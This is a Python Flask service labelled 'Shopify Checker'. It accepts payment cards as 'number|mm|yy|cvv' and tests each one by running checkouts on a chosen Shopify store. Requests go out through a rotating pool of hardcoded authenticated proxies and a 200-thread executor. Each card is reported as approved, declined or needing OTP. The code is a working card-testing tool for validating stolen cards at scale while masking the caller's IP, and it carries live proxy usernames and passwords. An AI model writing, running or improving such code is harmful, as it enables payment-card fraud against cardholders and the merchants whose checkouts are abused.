import json, os, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from gates_shopify_v2 import process_card
from flask import Flask, request, jsonify
import concurrent.futures, threading, itertools

app = Flask(__name__)
_sh2_exec = concurrent.futures.ThreadPoolExecutor(max_workers=200)
PROXIES = [
    "nWtrJqsb:RYYEE72Y@194.33.9.114:64170",
    "nWtrJqsb:RYYEE72Y@194.33.9.136:49520",
    "nWtrJqsb:RYYEE72Y@45.145.162.63:58536",
    "RrkJjUqfT:jYEH6Emdg@82.117.94.14:63126",
]
_proxy_cycle = itertools.cycle(PROXIES)
_proxy_lock = threading.Lock()

@app.route("/sh2")
def sh2_check():
    cc = request.args.get("cc", "")
    site = request.args.get("site", "").strip()
    if not cc or "|" not in cc: return jsonify({"error": "missing cc"}), 400
    if not site: return jsonify({"error": "missing site"}), 400
    proxy = request.args.get("proxy", "").strip()
    if not proxy:
        with _proxy_lock: proxy = next(_proxy_cycle)
    variant = request.args.get("variant", "").strip() or None
    t0 = time.time()
    fut = _sh2_exec.submit(_run, cc, site, proxy, variant)
    try:
        res = fut.result(timeout=150)
    except:
        return jsonify({"error": "timeout"}), 504
    success, message, gateway, price, currency = res
    message = str(message); mu = message.upper()
    if "ORDER_PLACED" in mu: status = "APPROVED"
    elif "OTP_REQUIRED" in mu or "ACTION_REQUIRED" in mu: status = "REQUIRES_ACTION"
    elif success is True or "VALIDATION_CUSTOM" in mu: status = "DECLINED"
    else: status = "ERROR"
    return jsonify({"cc": cc, "Gateway": gateway or "Shopify Payments", "Status": status,
        "Response": message, "Price": str(price), "Currency": currency or "USD",
        "IP": proxy.split("@")[-1].split(":")[0] if "@" in proxy else "direct",
        "timetaken": f"{time.time()-t0:.1f}s"})

def _run(cc, site, proxy, variant):
    import asyncio
    parts = cc.split("|")
    return asyncio.run(process_card(parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip(), site, variant, proxy or None))

@app.route("/")
def root():
    return jsonify({"gateway": "Shopify Checker", "endpoint": "/sh2?site=<store>&cc=<card|mm|yy|cvv>"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), debug=False, threaded=True)
